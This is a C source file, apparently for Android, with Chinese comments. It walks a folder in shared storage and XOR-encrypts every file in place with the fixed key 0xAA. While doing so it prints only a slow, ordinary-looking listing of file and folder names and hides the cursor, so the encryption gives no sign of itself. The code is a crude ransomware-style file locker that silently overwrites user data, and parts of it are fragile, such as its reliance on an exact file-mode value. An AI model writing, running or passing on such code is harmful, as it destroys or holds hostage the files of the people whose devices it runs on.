#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<dirent.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<unistd.h>
	// 根路径
char *ROOT_DIR = "/storage/emulated/0/lose/";
// 动态链表结构

// 数组赋值
void Assignment_Path(char *p1, char *p2)
{
	int i = 0;
	for (; i < 256; i++)
		p2[i] = p1[i];
}

void JiaMi(uint8_t *data, size_t size) {
  uint8_t key = 0xAA;
   for (int i = 0; i < size; i++)
      data[i] ^= key;
}
// 加密文件
int Lock_File(char Path[256])
{
	int key = 0xAA;				// 加密钥匙 
	// 调取和保存的文件路径 
	char inputPath[256], outPath[256];
	int i;
	// 把文件路径赋给调取和保存路径数组 
	Assignment_Path(Path, inputPath);
	Assignment_Path(Path, outPath);
	FILE *inputFile = NULL, *outFile = NULL;
	uint8_t *tmp=malloc(1024*1024);				// 得到新数据 
	if ((inputFile = fopen(inputPath, "rb+")) == NULL)
		return 0;
	fseek(inputFile, 0, SEEK_SET);
	//outFile = fopen(outPath, "wb");
	size_t index = 0;
	size_t size;

	while((size = fread(tmp, 1, 1024*1024, inputFile))>0)
	{
	   index += size;
		JiaMi(tmp, size);		// 与或运算加密 
		fseek(inputFile, index - size, SEEK_SET);
		fwrite(tmp, 1, size, inputFile);	// 写入新文件内 
		fseek(inputFile, index, SEEK_SET);
	}
	free(tmp);
	return 1;
}


void Add_Path(char *str, char ***paths, int *size)
{
	if (*size == 0)
		*paths = (char **)malloc(sizeof(char **) * 1);
	else
		*paths = (char **)realloc(*paths, sizeof(char **) * (*size + 1));
	(*paths)[(*size)++] = str;
}

// 比较大小
int cmp(char **p1, char **p2)
{
	char *str1 = *p1;
	char *str2 = *p2;
	return strcmp(str1, str2);
}

int main(void)
{
	DIR *a;						// 获取目录
	char **folder;				// 文件夹
	char **file;				// 文件
	int i = 0, count = 0;
	char *newName;				// 临时 保存文件名
	int folderI = 0, fileI = 0;
	struct dirent *dirp;		// 获取的文件结构
	struct stat fileInfo;		// 文件详细信息
	if ((a = opendir(ROOT_DIR)) == NULL)	// 获取此目录
	{
		printf("有误");
		return 0;
	}
	while ((dirp = readdir(a)) != NULL)	// 获取当前位置文件
	{
		if (i < 2)
		{
			++i;
			continue;
		}
		char fileDir[strlen(ROOT_DIR) + strlen(dirp->d_name) + 1];
		// 合成为完整路径
		sprintf(fileDir, "%s%s", ROOT_DIR, dirp->d_name);
		stat(fileDir, &fileInfo);
		if (fileInfo.st_mode == 33200)
		{						// 文件
			Lock_File(fileDir);
			newName = malloc(sizeof(char) * (strlen(dirp->d_name) + 1));
			strcpy(newName, dirp->d_name);
			Add_Path(newName, &file, &fileI);
			// printf("%s %d %d\n", file[0], fileI - 1,fileInfo.st_mode);
		}
		else	// 文件夹
		{					
			Lock_File(fileDir);
			newName = malloc(sizeof(char) * (strlen(dirp->d_name) + 1));
			strcpy(newName, dirp->d_name);
			Add_Path(newName, &folder, &folderI);
			// printf("%s %d \n", folder[folderI - 1], folderI - 1);
		}

	}
	i = 0;
	qsort(folder, folderI, sizeof(char *), cmp);
	qsort(file, fileI, sizeof(char *), cmp);
	usleep(100000);
	printf("=======文件夹:\n");
	usleep(70000);
	for (int i = 0; i < folderI; i++)
	{
		if (folder[i][0] == '.')
			printf("%s" "\n", folder[i]);
		else
			printf("%s""\n", folder[i]);
		usleep(70000);
	}
	printf("=======文件:\n");
	usleep(100000);
	for (int i = 0; i < fileI; i++)
	{

		if (file[i][0] == '.')
			printf("%s" "\n", file[i]);
		else
			puts(file[i]);
		usleep(70000);
	}

	printf("一共有文件:%d个", fileI + folderI);
	printf("\33[?25l");
	return 0;
}